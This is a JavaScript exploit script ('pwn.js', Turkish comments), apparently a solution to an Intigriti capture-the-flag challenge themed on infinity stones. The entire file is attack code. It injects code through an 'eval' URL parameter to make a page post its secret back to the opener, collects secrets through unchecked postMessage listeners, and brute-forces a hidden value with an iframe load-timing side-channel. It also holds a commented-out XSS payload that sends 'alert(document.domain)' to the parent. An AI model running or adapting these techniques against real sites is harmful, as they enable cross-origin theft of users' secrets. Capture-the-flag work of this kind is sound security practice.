// pwn.js - Final Versiyon
var stones = { space: '', soul: '', time: '', mind: '', power: '', reality: '' };

// Gelen mesajları dinle
window.addEventListener('message', function(e) {
    if (typeof e.data === 'string' && e.data.length === 8) {
        stones.space = e.data;
        checkWin();
    }
    if (e.data && typeof e.data === 'string' && e.data.startsWith('Soul:')) {
        stones.soul = e.data.split(':')[1];
        checkWin();
    }
});

// Soul Stone'u tetikle (Opener Fix)
function triggerSoul() {
    var payload = "opener.postMessage('Soul:'+soulStone, '*');window.close();";
    var target = "https://soul.challenge-1225.intigriti.io/?eval=" + encodeURIComponent(payload);
    window.open(target, 'soulWindow');
}

// Time Stone Oracle (Geliştirilmiş Timing)
async function crackTime() {
    var charset = '0123456789abcdef';
    var known = '';
    while (known.length < 8) {
        for (var i = 0; i < charset.length; i++) {
            var char = charset[i];
            var guess = known + char;
            var ifr = document.createElement('iframe');
            ifr.src = "https://time.challenge-1225.intigriti.io/search?q=" + guess + "&cache=" + Math.random();
            document.body.appendChild(ifr);
            
            var start = performance.now();
            await new Promise(r => ifr.onload = r);
            var duration = performance.now() - start;
            ifr.remove();

            // 500ms tamamen örnektir. Kendi tarayıcında konsolu izle.
            // /yes daha uzun sürer (resim var), /nope kısa sürer.
            if (duration > 500) { 
                known += char;
                break; 
            }
        }
    }
    stones.time = known;
    checkWin();
}

// Kazanma kontrolü
function checkWin() {
    // Örnek: Space ve Soul bulunduysa alert at
    if (stones.space && stones.soul) {
        var code = stones.power + stones.mind + stones.reality + stones.space + stones.soul + stones.time;
        // Eksik taşlar varsa sadece bulduklarımızı alertleyelim test için:
        alert("Space: " + stones.space + "\nSoul: " + stones.soul);
        
        // Finalde bu satırı aç:
        // parent.postMessage(code + "alert(document.domain)", '*');
    }
}

// Başlat
setTimeout(triggerSoul, 1000);
// crackTime();
